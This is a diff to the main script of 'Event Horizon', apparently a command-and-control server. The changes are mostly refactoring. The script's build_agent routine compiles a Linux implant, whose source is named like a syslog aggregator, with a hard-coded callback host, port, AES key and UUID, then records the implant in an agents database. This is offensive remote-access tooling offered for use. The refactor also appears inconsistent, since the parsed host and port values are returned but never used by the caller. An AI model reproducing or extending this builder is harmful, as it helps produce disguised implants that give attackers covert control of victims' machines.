@@ -1,3 +1,6 @@
+"""
+Event Horizon __main__.py
+"""
 import logging
 import os
 import sys
@@ -22,17 +25,16 @@ logging.basicConfig(
 
 
 def db_routine():
-    global db_cursor
+    """Routine to check the health of the database"""
 
     print("\n" + "-" * 20)
     logging.info("Checking database health...")
     db_cursor = check_db()
     print("-" * 20 + "\n")
+    return db_cursor
 
 
-def parse_agent_cmd(call: list[str, ...]) -> None:
-    global HOST, PORT, AGENT_NAME
-
+def parse_agent_cmd(call: list[str, ...]) -> tuple[str, str, str]:
     for i, arg in enumerate(call):
         if arg in ["--host", "-h"]:
             try:
@@ -51,9 +53,13 @@ def parse_agent_cmd(call: list[str, ...]) -> None:
         else:
             if arg.startswith("-"):
                 print(f"Unknown parameter '{arg}'")
-                exit()
+                sys.exit()
+    return HOST, PORT, AGENT_NAME
 
 def build_agent() -> None:
+    """
+    Build linux agent using command line parameters
+    """
     uuid: str = gen_uuid()
     logging.info("Successfully generated UUID for agent!")
     key: str = b64encode(rand_key()).decode('utf-8').ljust(32)[:32].replace(" ", "-")
@@ -69,7 +75,13 @@ def build_agent() -> None:
 
     logging.info("Building agent...")
     # agent/linux/aes.c
-    cmd = f"gcc -Wall agent/linux/main.c agent/linux/syslog_aggregator.c -o {AGENT_NAME} -D LHOST=\"{HOST}\" -D PORT={PORT} -D IV=\"{iv}\" -D KEY=\"{key}\" -D UUID=\"{uuid}\" -lcrypto -lssl"
+    cmd = f"gcc -Wall agent/linux/main.c agent/linux/syslog_aggregator.c -o {AGENT_NAME}\
+         -D LHOST=\"{HOST}\"\
+         -D PORT={PORT}\
+         -D IV=\"{iv}\"\
+         -D KEY=\"{key}\"\
+         -D UUID=\"{uuid}\"\
+         -lcrypto -lssl"
     logging.info(f"Running '{cmd}'")
     output = subprocess.check_output(cmd.split(), text=True)
     if AGENT_NAME in os.listdir():
@@ -78,7 +90,7 @@ def build_agent() -> None:
         print(output)
         logging.error("Agent generation failed!")
         return
-    
+
     logging.info("Adding agent information to agents database")
     try:
         add_agent(
@@ -108,13 +120,13 @@ if __name__ == "__main__":
                 print("Port must be a number!")
         elif arg in ["--generate-agent", "--generate", "-g"]:
             parse_agent_cmd(sys.argv[i + 1:])
-            db_routine()
+            db_cursor = db_routine()
             build_agent()
-            exit()
+            sys.exit()
         else:
             if arg.startswith("-"):
                 print(f"Unknown parameter '{arg}'")
-                exit()
+                sys.exit()
 
     logging.info("Initializing Event Horizon server...")
     db_routine()
